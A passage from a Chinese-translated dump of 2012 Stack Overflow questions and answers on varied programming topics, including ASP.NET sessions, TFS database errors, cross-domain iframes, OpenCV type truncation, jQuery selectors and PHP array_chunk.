* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:01:44.333

```
struct tm * data_emprestimo 
```

声明一个指向结构的指针，因此要将结构本身作为值返回，您需要取消对指针的引用，`return *data_emprestimo;`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:01:56.673

在我看来，您希望编写一个返回日期字符串表示的函数。

在 c++ 中 std::string 将是字符串数据的自然返回类型。更 C 风格的方法可能建议您传入 char * 作为您希望打印日期的缓冲区 - 通常 std::string 被认为是一种更清洁、更健壮的方法。

# asp.net - 单例会话 asp.net

> ID：13916416
> 
> 赞同：0
> 
> 时间：2012-12-17T14:52:05.477
> 
> 标签：asp.net, session, singleton

我在用户登录时获取了用户设置并将它们存储在单例会话中，下面是代码。
它是每个用户而不是应用程序范围。之前我将静态对象存储在会话中，并在所有用户之间共享，现在我创建了单例会话。

下面的代码线程安全吗？

```
 public string FirstName
    {
        get;
        set;
    }
 public string LastName
    {
        get;
        set;
    }

 public static Users Currentuser
    {
        get
        {
                HttpSessionState session = HttpContext.Current.Session;
                lock (padlock)
                {
                    if (session["UserInfo"] == null)
                    {
                        session["UserInfo"] = new Users();
                    }
                }
                return (Users)session["UserInfo"];
            }
   } 
```

我正在为每个请求创建新会话，并从中保存检索值。

# java - 提取计划作业的运行时间的问题

> ID：13916422
> 
> 赞同：0
> 
> 时间：2012-12-17T14:52:23.227
> 
> 标签：java, business-intelligence, business-objects, business-objects-sdk

我必须使用 BusinessObjects XI Java SDK 从以下查询中提取运行时和其他一些信息。

```
SELECT SI_STARTTIME, SI_ENDTIME, SI_NAME, SI_SCHEDULE_STATUS, SI_DESCRIPTION, SI_SCHEDULEINFO.SI_SCHEDULE_INTERVAL_MONTHS, SI_SCHEDULEINFO.SI_SCHEDULE_INTERVAL_NDAYS, SI_SCHEDULEINFO.SI_SCHEDULE_INTERVAL_NTHDAY, SI_SCHEDULEINFO.SI_SCHEDULE_INTERVAL_MINUTES, SI_SCHEDULEINFO.SI_SCHEDULE_INTERVAL_HOURS, SI_SCHEDULEINFO.SI_SUBMITTER FROM CI_INFOOBJECTS WHERE SI_INSTANCE=1 
```

我在提取计划作业的运行时间时遇到了一些麻烦。我试图从开始时间中减去结束时间，但结果是错误的。我预计给出 5 秒和 13897452000 秒。

有谁知道我如何获得预定作业的运行时间？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T16:15:41.110

尝试使用 ISchedulingInfo 接口来检索这两个日期。使用调度属性加载您的 IInfoObject（此处名为 scheduleInstance），然后：

```
ISchedulingInfo schedInfo = scheduledInstance.getSchedulingInfo(); 
Date beginDate = schedInfo.getBeginDate(); 
Date endDate = schedInfo.getEndDate(); 
```

# tfs - TFS 2012 - TF400013：发生意外的数据库错误

> ID：13916425
> 
> 赞同：2
> 
> 时间：2012-12-17T14:52:42.120
> 
> 标签：tfs

我有一个关键问题：我有一个 TeamProjectCollection。在这个集合中，我有一个项目。我需要重新创建相同的项目。我删除了这个项目并再次创建项目。在此之后，我在 TFS 上收到下一个错误： ![在此处输入图像描述](../Images/1c5f212c61a3fc99e8f70cb5599caec9.png)

当我尝试打开此集合中的任何项目时，会出现此错误。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-06-20T22:26:34.207

可能为时已晚，无法帮助 OP，...但是对于遇到此“TF400013：发生意外数据库错误”的任何其他人来说，这是我在 TFS2013 系统上解决它的方法。

1.  从管理员帐户启动 TFS 服务器上的 Microsoft SQL Server Management Studio (SMS)。
2.  从 SMS 的顶级菜单启动 [Tools|SQL Server Profiler]
3.  当提示 [Trace Properties] 时，选择`TSQL`[Use the template:] 组合框；因为默认值通常只会在 [TextData] 列中显示“加密文本”。 [![SQL 事件探查器|跟踪属性](../Images/b15aa37b877eca9e21faa184aacb6aca.png)](https://i.stack.imgur.com/1pVW9.png)
4.  执行违规操作。在我的例子中，我列出了来自 TFS Web 应用程序的项目的高级 [TEST] 页面。
5.  停止 SQL Profiler 中的跟踪并筛选相关的 [TextData] 列以查找正在生成“意外数据库错误”的违规 SQL。
6.  这可以通过将 [TextData] SQL 从 SQL Profiler 复制到 SMS 中的查询窗口来完成。您可能需要添加一个`USE Tfs_xxx`,`xxx`替换为您的 [Team Project Collection] 名称。请注意，某些查询旨在使用前面的 SQL 运行`USE Tfs_TFSConfiguration`，标识 TFSConfiguration 数据库而不是项目集合数据库。
7.  您可以在 SMS 中使用有问题的 SQL 来纠正“意外的数据库错误”，获得更好的诊断错误消息，并获得对 TFS 系统进行 UI 或数据库更正所需的可能洞察力。

> ！！！请注意，您从 SMS 对 TFS 数据库所做的任何更改都将使您的 Microsoft TFS 支持协议无效。！！！

在我的系统上，TFS [TEST] Web 应用程序崩溃了，因为有人（我）向对话框中列出的页面查询添加了一个 [Column option]（来自页面的 UI），但显然不受支持。页面的数据表查询因“列名无效”的内部数据库错误而失败。在 SQL Profiler 中，在数据表填充 SQL 之前，有一个查询要显示的列，其中包括 SQL 结果中的违规“未知列名”：

```
exec prc_QueryRegistry
 @partitionId=1
,@registryPath=N'#\Users\f64...91f\WebAccessTestManagement\b81...cb7\TestHub\ColumnSettings\' 
```

对我来说最快的解决方法是取消*我不存在的*Microsoft TFS 支持协议，通过在 SMS 中执行以下 SQL 来清除此列设置

```
exec prc_SetRegistryValue @partitionId=1
,@key=N'#\Users\f64...91f\WebAccessTestManagement\b81...cb7\TestHub\ColumnSettings\'
,@value=''
,@identityName='your name here' 
```

# javascript - location.href 不改变 iframe src

> ID：13916426
> 
> 赞同：4
> 
> 时间：2012-12-17T14:52:45.173
> 
> 标签：javascript, jquery, iframe

我需要检查 iframe src 以了解父页面的更改。

```
$('myiframe').attr('src'); 
```

工作正常，但是当我从 iframe 中通过 javascript 更改 url 的哈希时

```
location.href += '#hash'; 
```

我可以看到它从 iframe 检查 location.href 发生了变化，但从父文档中，src 似乎没有改变。有什么帮助吗？

**编辑**

由于包含页面和 iframe 位于不同的域中，因此我必须使用 src 属性对其进行检查，并且无法访问 iframe`location.href`属性。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:59:19.700

哈希参数不在属性 location.href 中，请尝试

```
location.hash = 'hash'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:14:15.850

我怀疑你是否可以简单地从父 javascript 中做到这一点。因为那样我可以：

1.  创建一个带有隐藏 iframe 的页面。（比如[http://mysite.com/fake](http://mysite.com/fake)）
2.  在 iframe 中，在某个网站的登录过程中打开一些中间页面（类似于[https://accounts.google.com/redirlogin](https://accounts.google.com/redirlogin)）
3.  如果孩子的 cookie 存在并且没有足够的照顾，框架内的页面将重定向到实际网站，用户登录。
4.  从父页面，我可以检查它所经过的所有中间 url，它们基本上可以包含一些会话 ID。

注意：我在 orkut 的日子里做过类似的事情，并且“中间登录页面”用于重定向到 orkut。这是为我想要实现的自动登录功能完成的。但是，我无法在父页面中获得任何信息。

笔记：

1.  我可能完全错了，但我觉得从安全角度来看，这从纯父端代码是不可能的。孩子应该通知家长。
2.  它可能确实适用于域内站点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:16:45.960

允许跨域框架设置但不能读取彼此的位置。（为什么？嗯，读取彼此的位置会违反相同的来源策略，可能会泄漏出现在 URL 中的敏感信息。我不完全确定为什么允许设置它们。历史上，站点使用导航父页面的能力到[framebust](http://en.wikipedia.org/wiki/Framekiller)，但这不再那么重要了。）

因此，如果您尝试使用散列片段进行跨域帧通信（并且由于某种原因不能使用 postMessage），那么这样做的方法是让内部框架更改其父位置的散列片段，使用`window.top.location.href`. 然后，父页面应该经常检查其哈希片段的更改。

[这](http://dl.dropbox.com/u/14376395/html/xdomain.html#test "这里")是我找到的一个演示。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-01-05T15:21:03.060

此片段适用于 youtube 剪辑、pdf 和 html 页面（除非框架被目标网站故意阻止）

该链接会将文档“htp://someurl”呈现为 div id="someID" 内的匿名 iframe

```
`<a href="htp://someurl" onclick="renderLink('someID');return false;" title="Click to view external document">view external document</a>`

`function renderLink() {`   
    `if (!e) var e = window.event;`
    `var pdfsrc = e.srcElement.getAttribute('href');`
    `var $pdfdiv = document.getElementById('someID');`
    `var $pdfTarget = $pdfdiv.getElementsByTagName("iframe")[0];`
    `$pdfTarget.src = pdfsrc;`
   `}` 
```

# c# - 在 C# 中失去与 sql server 2008 的连接

> ID：13916434
> 
> 赞同：2
> 
> 时间：2012-12-17T14:53:13.973
> 
> 标签：c#, sql, sql-server, debugging, sqlconnection

我使用`SqlConnection`该类连接到服务器，经过一段时间和一些查询，我得到了非常常见的

> 建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：命名管道提供者，错误：40 - 无法打开与 SQL Server 的连接）。

问题是我可以连接到服务器，但我只是在运行一些查询之后才得到错误，而这是一个经典的根本无法连接的错误......

为什么会这样？什么可能导致这种行为？

任何帮助/方向将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:06:15.663

This sounds like a problem with connection pooling. Check the lifecycle of sql connection object.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:09:01.703

如果在调试应用程序时发生这种情况，那是完全正常的。

在您检查代码并继续执行下一个查询之后，虽然您的代码中的连接仍未关闭，但它实际上已超时。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-12-17T15:56:49.853

检查保持活动超时并在您的 SQL 服务器连接参数中相应地推进它。SQL Server 在短暂的停机时间不活动计时器后丢弃没有活动的连接

# c++ - CMAP 上的 MFC C++ 查找

> ID：13916443
> 
> 赞同：1
> 
> 时间：2012-12-17T14:53:45.850
> 
> 标签：c++, mfc

当我`.lookup(key, value)`在项目成员 MFC 上使用 a 时`CMap`。
返回值是否通过引用？

模板：

```
CMap<ID_TYPE, ID_TYPE, CSimulatedRule, CSimulatedRule&> m_SimulatedRules; 
```

如果我编辑值成员，例如`value.setAge(10);`它会改变值`Map`吗？或者只是我目前拥有的价值对象？

代码：

```
CSimulatedRule simulatedRule;
m_SimulatedRules.Lookup(ro.Id(),simulatedRule); 
```

编辑`simulatedRule`时，它将编辑`CMap`?上的对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T10:31:24.177

这不会改变地图中的对象。请改用 PLookup。

# shopify - Shopify 订单 webhook - 在通过之前延迟

> ID：13916454
> 
> 赞同：1
> 
> 时间：2012-12-17T14:54:32.680
> 
> 标签：shopify

我已经构建了一个应用程序，当有人完成购买时，它会在结帐完成页面上显示可下载的媒体。这是基于 webhook 在购买完成后立即将订单详细信息发送到我的服务器。到目前为止这一直很好，但最近在购买 webhook 后大约需要 50 秒，现在这是永久性的吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:14:34.037

是的。[请参阅此处](http://ecommerce.shopify.com/c/shopify-apis-and-technology/t/announce-webhooks-don%E2%80%99t-depend-on-their-real-timey-ness-115431)的公告。

# java - 在不使用字符串的情况下使数据库表选择尽可能静态

> ID：13916456
> 
> 赞同：1
> 
> 时间：2012-12-17T14:54:34.863
> 
> 标签：java, database, builder-pattern

首先，这个问题会有点长，但为了完整地解释我的问题，我觉得我必须给你很多关于我的项目的信息，所以请多多包涵！

我在一家经常使用图表的公司工作，为了避免总是不得不从 scats 创建图表的麻烦，我决定创建一个新的 java 项目并创建一个“包”，我和我的同事可以使用它来创建这些图表。你可以称它们为通用的。

所以这个项目使用了构建器模式和大量的接口和抽象类。这个想法是客户端（开发人员）使用这些接口、模式和类并覆盖这些方法以适应流程。客户（开发人员）唯一剩下的事情就是填写这些方法并为他自己创建 UI 并发布程序。

该程序正在很好地形成，我创建了很多我非常自豪的功能（因为我是学生）我认为我已经很好地规划了整个过程，但我遇到了一些问题！

首先，让我向您展示这些类并解释数据流（我会尽可能短）：

首先是 GUI（这是一个用户必须自己创建的类，但他可以使用内置包通过以下代码创建他的图表）：

```
ChartBuilder cb = new LineChartBuilder();
                  Director d = new Director();
d.buildTypeOne(cb, "Hello", PeriodSelection.HOUR,""); 
```

有了这个，导演现在准备建立一个图表。

这`PeroidSelection.Hour`是一个设置标准时间的枚举，在这种情况下它将图表类别轴设置为我们打开我们的时间，因此收集的数据知道它必须每小时获取数据（在这种情况下从 8.00 - 19.00）原因为什么这是一个枚举是因为这些类型的时期是最后唯一可以改变的是我们的开放日期和时间，然后我们将能够很容易地改变！这是预览`PeriodSelection enum`：

```
 public enum PeriodSelection{
    HOUR(new String[]{"8:00", "9:00", "10:00", "11:00", "12:00", "13:00", "14:00", "15:00", "16:00", "17:00", "18:00", "19:00"}),
    MONTH(new String[]{"Jan", "Feb", "Marts", "April", "Maj", "Juni", "Juli", "Agu", "Sep", "Oct", "Nov", "Dec"}),
    DAYS(new String[]{"Mandag", "Tirsdag", "Onsdag","Torsdag","Fredag","Lørdag","Søndag"});

    private String[] timeIntervals;
    private PeriodSelection(String[] timeIntervals){
        this.timeIntervals = timeIntervals;
    }
    public String[] getTimeIntervals(){
        return timeIntervals;
    }
} 
```

进入 Director，director 现在已准备好构建图表，但首先它必须从数据库中收集数据：

```
 public void buildTypeOne(ChartBuilder builder, String title, PeriodSelection selection, String queueName){
    try {
        builder.setObjectList(stat.getData(queueName, start, end));
    } catch (DopeDBException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    builder.selection = selection;
    builder.initiate(title);
    builder.createSeries();
    builder.createSymbol();

    builder.createTable();
} 
```

正如您所看到的，构建器是以某种方式构建的，这是因为图表由表格和图表组成，并且这两者必须链接在一起，我不会详细介绍图表，因为它与我的问题。

现在，方法的第一行中显示的 stat 类`buildTypeOne`extends 和调用的抽象类`statisticPattern`看起来像这样：

```
public abstract class StatisticPattern {

protected ArrayList<ObjectInterface> cq = new ArrayList<>();
protected ObjectInterface contact;
protected ProviderInterface p;
/**
 * 
 * 
 * {@link Constructor}
 */
public StatisticPattern(){
    try {
        p = new Provider();
    } catch (DopeDBException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}
/**
 * 
 * @param name
 * @param start
 * @param end
 * @return
 * @throws SQLException
 * @throws DopeDBException
 */
protected ArrayList<ObjectInterface> getData(String name, DateTime start, DateTime end) throws SQLException, DopeDBException{
    return cq;
}
/**
 * 
 * @param contact2
 */
protected void processSingleQueueData(ObjectInterface contact2) {
}
/**
 * 
 * @param queueName
 * @throws SQLException
 */
protected void obtainNewData(String queueName) throws SQLException {

}

/**
 * 
 * @param name
 * @param start
 * @param end
 * @return
 */
protected boolean doIhaveIt(String name, DateTime start, DateTime end) {
    return false;
}
/**
 * 
 * @param start
 * @param end
 * @return
 */
protected boolean checkDatas(DateTime start, DateTime end) {
    return start.toDateMidnight().isEqual(end.toDateMidnight());
}
/**
 * 
 * @param start
 * @param end
 * @return
 */
protected Integer daysBetween(DateTime start, DateTime end) {
    return  end.dayOfYear().get()-start.dayOfYear().get();

} 
```

如前所述，此类的目的是我们的开发人员将扩展类并覆盖方法，以便主管可以找到这些方法并使用它们，他们选择实现和填充方法的方式因程序而异。

在这个程序中，统计类看起来像这样：

```
public class Statistics extends StatisticPattern {
private DateTime start;
private DateTime end;

/**
 *  This class checks whether the program has already collected the data
 * @Override
 */
public ArrayList<ObjectInterface> getData(String name, DateTime start, DateTime end) throws DopeDBException{
    if (this.start.equals(start) && this.end.equals(end)) {
        if (name.equalsIgnoreCase("All")) {
            return cq;
        }else if (doIhaveIt(name, start, end)) {
            return cq;
        }
    }else {
        try {
            obtainNewData(name);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
    return cq;
}
@Override
protected void obtainNewData(String queueName) throws SQLException {
    setDates(start, end);
    this.cq = p.obtainData(start, end, queueName);

} 
```

如您所见，我创建了自己的方法实现，`getData`该方法调用该`obtainNewData`方法，然后从 p （我们的提供程序类 - 也称为与数据库的连接）获取数据。

您可能已经猜到的提供程序类也实现和接口，其中方法中只有一个`obtainData`方法

```
public interface ProviderInterface {

public ArrayList<ObjectInterface> obtainData(DateTime start, DateTime end, String name) throws SQLException; 
```

}

同样，开发人员必须实现此方法，但可以随心所欲地填充它。这里最重要的是返回类型是 ObjectInterface 类型的 ArrayList：

```
public interface ObjectInterface {

HashMap<String, Integer> data = new HashMap<String, Integer>();
String type = "";

public String getType();
public void addData(String key, Integer value);
public Integer getData(Object key); 
```

}

基本上，它必须实现一个包含图表应填充的所有数据的哈希图。此数据将在创建对象时添加，然后添加到提供程序中的列表中，然后将返回此列表，然后 Director 将其设置为 chartbuilders 的数据列表，然后填充图表。

在这种情况下，必须填充图表的最终对象如下所示：

```
public class ContactQueue implements ObjectInterface {

    private HashMap<String, Integer> data = new HashMap<String, Integer>();
    private String type;
    public ContactQueue(String type){
        this.type = type;
    }
    public String getType(){
        return type;
    }
    public void addData(String key, Integer value){
        if (data.containsKey(key)) {
            Integer i = data.get(key);
            data.put(key, value+i);
        }else {
            data.put(key, value);
        }

    }
    public Integer getData(Object key){
        return data.get(key);
    }
    public String toString(){
        return type;
    }
} 
```

现在问题来了！

当只收集一种类型的数据时，所有这些都可以完美运行。但是我目前正在处理的程序必须从 5 个不同的表中获取数据，所有这些表都必须添加到他们的每个图表中我的问题是我将如何设计它以便它选择数据库表？并返回该特定表的列表？

我已经尝试过以下代码：

```
 if (name.equalsIgnoreCase("Besvarelse")) {
        return besvarelse25(start, end);
    }else if (name.equalsIgnoreCase("intern")) {
        return intern(start, end);
    }else if (name.equalsIgnoreCase("besvarelseProcent")) {
        return besvarelseProcent(start,end);
    }else if (name.equalsIgnoreCase("Email_data")) {
        return email_data(start, end);
    }else if (name.equalsIgnoreCase("Email_Hånd")) {
        return email_haand(start, end);
    }else if (name.equalsIgnoreCase("Email_Antal")) {
        return email_antal(start, end);
    }
    else if (name.equalsIgnoreCase("Henvendelser")) {
        return henvendelser(start, end);
    } 
```

然而，至少可以说，这似乎有点多余，而且很难看。

我曾考虑过再次创建一个枚举，客户（开发人员）每次想要创建一个新程序时都必须更改，但我不确定这是正确的方法吗？

我也很想听听您对整个项目的看法？我是成功了还是失败了？

感谢您阅读，我将期待阅读您的回复

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:11:53.093

老实说，我没有完全阅读 OP 并直接提出问题。道歉......
任何时候你有这样的代码：

```
if (name.equalsIgnoreCase("Besvarelse")) {
        return besvarelse25(start, end);
    }else if (name.equalsIgnoreCase("intern")) {
        return intern(start, end);
    }else if (name.equalsIgnoreCase("besvarelseProcent")) {
        return besvarelseProcent(start,end);
    }else if (name.equalsIgnoreCase("Email_data")) {
        return email_data(start, end);
    }else if (name.equalsIgnoreCase("Email_Hånd")) {
        return email_haand(start, end);
    }else if (name.equalsIgnoreCase("Email_Antal")) {
        return email_antal(start, end);
    } 
```

考虑使用[工厂模式](http://en.wikipedia.org/wiki/Factory_method_pattern)。工厂模式是这种情况下的标准方式（另请阅读抽象工厂）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:23:52.153

**意见：**因为您似乎在最后根据后备数据库进行过滤，所以解决方案很简单/优雅。是的，它是多余且丑陋的，但具有 5 个相似信息表的模式也是如此（如果我没看错的话）。如果它有效，我认为你没有问题。

如果您担心需要选择“正确类型”的表格，您可能会找到每个表格的通用质量：

像->

```
 SELECT 
    generic.specificField AS "genericKey",
    ....
  FROM
    TableOne generic 
```

然后，您可以创建一个 HashMap（或对象，您的调用），以满足您设计的某种程度的一致性。

再次类似 ->

```
 for(Field f : resultSet.values())//Pseudo Code, obviously javax.sql is a bit more complex
    hashMap.put(f.getName(), f.getValue());
...
  return genericProcessing(hashMap, start, end); 
```

因为您知道键/方法（由您的 SQL 别名定义），所以您有一个简单的解决方法。但是，如果这是一个公共 API，那么更“严格”（接口）的东西可能是更好的选择。

如果您的数据不相关，那么我会说您的设计反映了数据。这没什么不好。

（**第二种观点**，上面建议的工厂模式只是另一种抽象形式。Java 生态系统中的很多人都喜欢它，但也有很多人讨厌它——我在这里属于第二阵营）。一般来说，我会先尝试抽象你的问题，如果你不能抽象它可能很简单。在您的情况下，我认为您可能可以使用方法/查询对其进行抽象。如果你不能，那么跳到一个类型（工厂是一种方法）可能是你最好的答案。

# c++ - OpenCV：分配给 int16_t 类型的 Mat 给出全零

> ID：13916457
> 
> 赞同：0
> 
> 时间：2012-12-17T14:54:35.707
> 
> 标签：c++, opencv, mat

我有以下代码：

```
string filename = "frame_00003_depth.bin";

int16_t* depth_img = loadDepthImageCompressed(filename.c_str());

Mat depth_img_meters = Mat(480, 640, CV_16UC1);

for(int row = 0; row < 480; row++){
    for(int col = 0; col < 640; col++){
        depth_img_meters.at<int16_t>(row, col) = depth_img[(640*row + col)]  * 0.001;

        cout << depth_img_meters.at<int16_t>(row,col)<< "meters" <<  endl;  

    }
} 
```

我已经检查过数组`int16_t* depth_img`中的值是否大于 100，但是当分配给`Mat`此处时，它会打印全零

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:19:38.727

对我来说似乎是一个截断问题。

您将值乘以`depth_img`0.001，这意味着数字将转换为浮点数，然后返回到`int16_t`分配过程中。这意味着任何小于 1000 in 的值`depth_img`都将被截断为零`depth_img_meters`

任何时候处理不同的数据类型时，都必须注意在赋值期间与这种隐式转换相关的错误。

# linq-to-sql - Linq pivot查询，列中的数据成为列标题

> ID：13916459
> 
> 赞同：0
> 
> 时间：2012-12-17T14:54:37.903
> 
> 标签：linq-to-sql, pivot

我有以下一组数据： ![在此处输入图像描述](../Images/a508dbb5549d3836caa4c1b7254bf658.png)

我需要以 SupplierPartNumber 为中心，以便 Attribute 成为列标题： ![在此处输入图像描述](../Images/6283e4e5b1047becaa60e58ced438660.png)

我可以在 SQL 中做到这一点（结果如上图所示），但我不知道如何将其转换为 LINQ。任何人都可以就如何做到这一点提供一些建议吗？需要初始数据集，因此我可以将结果集保存在内存中，并在同一页面上查询其他列，如属性类型，而无需进一步查询数据库。

谢谢

# javascript - 函数原型 JS 中的变量可见性

> ID：13916460
> 
> 赞同：0
> 
> 时间：2012-12-17T14:54:38.467
> 
> 标签：javascript, arrays, visibility

我有一个源 js 文件，其中有这段代码。我需要`est_bandwidth`在脚本中管理数组，但即使我确定创建正确，我也无法在全局范围内看到。为什么？我怎样才能在函数之外看到数组？

```
var maxBandwidth = 8 * 1024 * 1024;        // 8 Mbps
var est_bandwidth = new Array();
function bandwidth(initial_bps, weight_f, weight_s){

    this.bps = initial_bps;
    this.weight_f = weight_f;
    this.weight_s = weight_s;

}

bandwidth.prototype.calcWeightedBandwidth = function(_bps) {
    this.bps = parseInt(((this.weight_f * this.bps) + (this.weight_s * _bps)) / 2) * 0.9;
    if (this.bps > maxBandwidth && maxBandwidth > 0) this.bps = maxBandwidth;
    est_bandwidth.push(this.bps / 1024);
    return this.bps;
} 
```

我尝试访问时的结果`est_bandwidth`是一个空数组。如果我在声明后修改：

```
est_bandwidth[0] = 1;
est_bandwidth[1] = 2; 
```

在我的控制台中，我得到 [1,2]。我可以看到`est_bandwidth`，但只能在函数之外看到，我不知道为什么。

这是完整的代码：[https](https://jsfiddle.net/4DY5C/1) ://jsfiddle.net/4DY5C/1 。您必须参考`banda_stimata`而不是`est_bandwidth`. 代码位于源代码中的 bandwidth.js 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:01:34.770

我只是将您的代码粘贴到 JavaScript 控制台中，然后运行以下序列：

```
> bw = new bandwidth(9600, 0.8, 0.9)
bandwidth
> bw.calcWeightedBandwidth(9600)
7344
> est_bandwidth
[7.171875] 
```

所以代码似乎运行良好，我可以`est_bandwidth`毫无问题地访问。

您是否以不同的方式执行脚本？

# jquery - jQuery选择动态ID

> ID：13916465
> 
> 赞同：0
> 
> 时间：2012-12-17T14:54:57.157
> 
> 标签：jquery, html

我需要使用 JQuery 选择动态 id，一旦选择它，我需要对其执行一些操作。

```
<input id="content_photos_attributes_1355755712119_image"   name="content[photos_attributes][1355755712119][image]" size="30" type="file"> 
```

HTML 包含 ID 和 Name 属性。我不在乎我可以选择哪一个，只要它被选中。这是我迄今为止尝试过的，但没有成功。

```
<script type="text/javascript">
jQuery.noConflict();
jQuery("#add_photo_product").click(function() {

alert("Handler foooor .click() called.");

//var field = $("input[id *= 'content_photos_attributes_']");
var field = $('input[name*="content"]');
alert (field);

}); 
```

第一个选择器有效，我可以轻松抓住它。一旦它被执行，DOM 就会填充我可以掌握的那个（在 HTML 代码下）。

我尝试了各种组合，但它始终为空。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:58:49.437

你跑了`jQuery.noConflict()`，这意味着 $ 不是 jQuery。尝试使用`jQuery`而不是`$`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:13:02.237

尝试替换这个

```
 jQuery("#add_photo_product").click(function() { 
```

这样

```
 jQuery("#content_photos_attributes_1355755712119_image").click(function() { 
```

您没有制作`id`html 代码中显示的内容

为了更好地运行你的测试，做简单的警报只是为了测试它是否有效

像那样

```
 alert(1);     // this will alert 1 
```

编辑2>

如果你有像变量一样的 id 那么你也可以这样做

```
 var myid = "content_photos_attributes_"+your_variable+"_image" ;
             // note that your_variable is this which generates 1355755712119 

    jQuery("#"+myid).click(function() { 
```

# php - PHP - array_chunk - 无法使其正常工作

> ID：13916466
> 
> 赞同：1
> 
> 时间：2012-12-17T14:55:11.107
> 
> 标签：php

大家好，我是 php 世界的新手，还在学习，我完全迷路了。我已经尝试了一切并阅读了很多博客，但没有什么能帮助我弄清楚如何去做。我有这段代码（下面），它工作得很好..它把一个长列表分成 5 个元素的块，这要归功于`<ul>`& `<li>`。

```
<?php
$values = range(1, 31);
$rows = array_chunk($values, 5);

foreach ($rows as $row) {
    print "<ul>";
    foreach ($row as $value) {
        print "<li>" . $value . "</li>";
    }
    print "</ul>";
}
?> 
```

但是当我尝试将它与我的其他代码（如下）合并时，它停止工作。它只显示`<ul>`'s，没有数据放入`<li>`'s甚至不显示。

```
<?php 
        $product = Mage::getModel('catalog/product');
        $attributes = Mage::getResourceModel('eav/entity_attribute_collection')
        ->setEntityTypeFilter($product->getResource()->getTypeId())
        ->addFieldToFilter('attribute_code', 'manufacturer');
        $attribute = $attributes->getFirstItem()->setEntity($product->getResource());
        $manufacturers = $attribute->getSource()->getAllOptions(false);
?>

<ul> 
<?php foreach ($manufacturers as $manufacturer): ?>
    <li>
        <a href="/manufacturer/<?php echo $manufacturer['label'] ?>">
            <?php echo $manufacturer['label'] ?>
        </a>
    </li>
<?php endforeach; ?>
</ul> 
```

这是我尝试过的变体之一（没有显示 500 错误的变体）

```
<?php
$rows = array_chunk($manufacturers, 5);

foreach ($manufacturers as $manufacturer) {
    echo "<ul>";
    foreach ($row as $manufacturer) {
        echo "<li>"  ?> 
                <a href="/manufacturer/<?php echo $manufacturer['label'] ?>"><?php echo $manufacturer['label'] ?></a>
<?php   echo "</li>"; ?>
<?php    }
    echo "</ul>";
}
?> 
```

我可能知道我正在做的事情是完全错误的，但正如我所说，我还是新手（我知道我还有很长的路要走。）

任何帮助都将不胜感激。先感谢您！

编辑：数组（[value] => 15 [label] => Jordan）数组（[value] => 19 [label] => Maison Scotch）数组（[value] => 5 [label] => Museum）数组（ [value] => 17 [label] => Nike ) Array ( [value] => 16 [label] => Nike Basket ) Array ( [value] => 11 [label] => On Tour ) Array ( [value] => 7 [label] => PeB ) Array ( [value] => 14 [label] => Penfiled ) Array ( [value] => 4 [label] => 总统的 ) Array ( [value] => 23 [label ] => Scotch & Soda ) Array ( [value] => 12 [label] => Solovair ) Array ( [value] => 13 [label] => Supra ) Array ( [value] => 20 [label] => Vans ) Array ( [value] => 18 [label] => Wood Wood )

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:03:14.813

你混合你的变量。可能你想要这样的东西：

```
<?php
$rows = array_chunk($manufacturers, 5);

foreach ($rows as $row) {
?>
    <ul>
    <?php foreach ($row as $manufacturer) { ?>
        <li>
            <a href="/manufacturer/<?php echo $manufacturer['label']; ?>">
                this is a link
            </a>
        </li>
    <?php } ?>
    </ul>
<?php } ?> 
```

请注意变量是如何在两个 foreach 循环中级联的。

# ms-access - MS-Access 2003 删除了我的总机表格

> ID：13916473
> 
> 赞同：2
> 
> 时间：2012-12-17T14:55:42.337
> 
> 标签：ms-access, ms-access-2003

我犯了一个菜鸟错误并删除了我的表单总机。我在总机管理器中有我所有的总机控件，但没有表格。我怎样才能取回它或根据现有控件创建一个新控件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:27:52.713

当您使用*Switchboard Manager*编辑`Switchboard`表单时，表单本身不会更改。相反，您的更改会保存到表格中`Switchboard Items`，该表格会提供给表单。

删除表格并不一定会删除表格。只要该表仍然存在，您就可以恢复表单的先前状态：

1.  将`Switchboard Items`表重命名为`xSwitchboard Items`
2.  启动*总机管理器*
3.  `Yes`当它请求创建新交换机的权限时单击
4.  对新总机进行*任何编辑*
5.  关闭*Switchboard Manager*并确认新的 Switchboard 表单可操作
6.  关闭表格
7.  删除新`Switchboard Items`表
8.  将`xSwitchboard Items`表重命名为`Switchboard Items`

然后，每当您再次打开`Switchboard`表单时，它都会从原始版本中读取所需的所有内容`Switchboard Items`。

OTOH，如果在删除表单时也删除了原始`Switchboard Items`表，那么您就不走运了，唯一的解决方案是从备份中恢复。

顺便说一句，我的印象是许多有经验的 Access 开发人员似乎不喜欢 Switchboard 功能。它太有限和不灵活。

# mysql - 连接表大量增长

> ID：13916474
> 
> 赞同：1
> 
> 时间：2012-12-17T14:55:43.117
> 
